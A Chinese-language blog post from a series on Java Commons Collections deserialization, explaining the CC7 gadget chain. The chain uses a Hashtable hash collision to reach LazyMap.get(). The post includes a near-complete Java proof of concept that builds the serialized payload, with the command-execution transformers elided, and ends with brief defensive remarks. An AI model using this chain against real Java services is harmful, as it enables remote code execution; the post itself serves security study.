---
title: "Java CC · CC7：Hashtable 与 equals 链"
series: java-cc-deserialization
series_order: 8
date: 2026-04-25 11:40:00 +0800
categories:
  - javaCC
---
# CC7：Hashtable 的 equals 链


### 为什么需要 CC7？
CC7 是另一条利用 `Hashtable` 作为入口的链子。与 CC6 利用 `hashCode` 不同，CC7 利用了 `Hashtable` 在处理哈希冲突时调用的 `equals` 方法。

### 核心原理
`Hashtable` 在反序列化 `reconstitutionPut` 时，如果遇到哈希冲突，会调用 `e.key.equals(key)`。我们可以构造两个哈希值相同但内容不同的 key（如 "yy" 和 "zZ"），使它们落入同一个哈希桶。

**调用链：**
```text
Hashtable.readObject()
  → reconstitutionPut()
    → e.key.equals(key)
      → AbstractMapDecorator.equals()
        → AbstractMap.equals()
          → LazyMap.get()
            → factory.transform()
```

### 完整 POC
构造时需要注意，两个 `LazyMap` 需要通过哈希碰撞放在一起，且需要清理掉构造过程中产生的多余 key。

```java
package com.nk7;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CommonsCollections7 {
    public static void main(String[] args) throws Exception {
        // 注意：假链必须为空，否则会影响哈希计算
        Transformer[] fakeTransformers = new Transformer[]{};
        Transformer[] realTransformers = new Transformer[]{
            // ... 同 CC1 执行链
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map outerMap1 = LazyMap.decorate(innerMap1, transformerChain);
        outerMap1.put("yy", 1);

        Map outerMap2 = LazyMap.decorate(innerMap2, transformerChain);
        outerMap2.put("zZ", 1); // "yy".hashCode() == "zZ".hashCode()

        Hashtable table = new Hashtable();
        table.put(outerMap1, 1);
        table.put(outerMap2, 2);

        // 清理构造过程中产生的 key
        outerMap2.remove("yy");

        // 替换真链
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, realTransformers);

        serialize(table);
        unserialize("ser.bin");
    }
}
```

### 绕过与防护分析
CC7 进一步扩充了攻击面，表明不仅是 `HashMap`，`Hashtable` 等集合类都可能成为反序列化的跳板。这再次印证了“入口无穷无尽”的观点，防御重心必须从“封堵入口”转向“切断执行链”或“过滤数据流”。
